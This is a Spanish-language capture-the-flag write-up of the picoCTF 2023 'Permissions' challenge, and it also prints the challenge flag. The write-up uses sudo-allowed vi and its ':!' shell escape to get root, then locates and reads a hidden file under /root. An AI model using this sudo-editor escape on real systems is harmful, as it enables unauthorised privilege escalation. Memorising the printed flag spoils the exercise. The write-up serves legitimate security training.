# General Skills — Permissions

## Descripción
> **Prompt oficial del reto:** "Can you read files in the root file? The system admin has provisioned an account for you on the main server. Can you login and read the root file?" — se entrega acceso SSH (`ssh -p <puerto> picoplayer@saturn.picoctf.net`, contraseña provista). Etiqueta de tema: **"vim"**.
>
> **Hints:**
> 1. What permissions do you have?

- **Categoría:** General Skills
- **Dificultad:** Medium
- **Evento/origen:** picoCTF 2023
- **Autor:** Geoffrey Njogu

## Solución
`sudo -l` (necesita forzar un pty con `ssh -t` y `export TERM=xterm`, si no `sudo` se queja de que hace falta terminal) revela:

```
User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

A diferencia de otros retos de esta serie (`ABSOLUTE NANO` con `nano`), aquí **sí pide contraseña** (la misma de la cuenta SSH) — no es `NOPASSWD`, pero eso no cambia nada: sigue siendo un escape clásico documentado en [GTFOBins - vi (Sudo)](https://gtfobins.github.io/gtfobins/vi/#sudo). Dentro de `vi`, el modo comando `:!<comando>` ejecuta cualquier comando de shell con los privilegios del propio `vi` (root, vía `sudo`):

```bash
sudo /usr/bin/vi
# dentro de vi:
:!id
# uid=0(root) gid=0(root) groups=0(root)
```

La flag no estaba en la ruta obvia `/root/flag.txt` (no existe) — hubo que buscarla:

```
:!find / -maxdepth 4 -iname '*flag*' 2>/dev/null
# /root/.flag.txt   <- archivo oculto

:!cat /root/.flag.txt
# picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```

## Notas adicionales
- Mismo patrón que `ABSOLUTE NANO` (nano) de este mismo bloque, pero con `vi`/`vim`: cualquier editor con capacidad de ejecutar comandos de shell (`:!`, `^R^X`, etc.) autorizado vía `sudo`, sin importar a qué archivo esté restringido en teoría, es una escalada de privilegios total.
- La flag estaba deliberadamente en un **archivo oculto** (`.flag.txt`) dentro de `/root`, no en la ruta convencional `flag.txt` — recordatorio de no asumir el nombre/ubicación exacta y en su lugar usar `find -iname` una vez lograda la ejecución con privilegios.
- Automatizado con `expect`: crítico exportar `TERM=xterm` antes de invocar `sudo vi` (sin `$TERM` válido la sesión falla o se comporta erráticamente en un pty no interactivo real).

## Referencias
- Reto: https://learn.cylabacademy.org/library/363
- Apoyo: [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/#sudo)
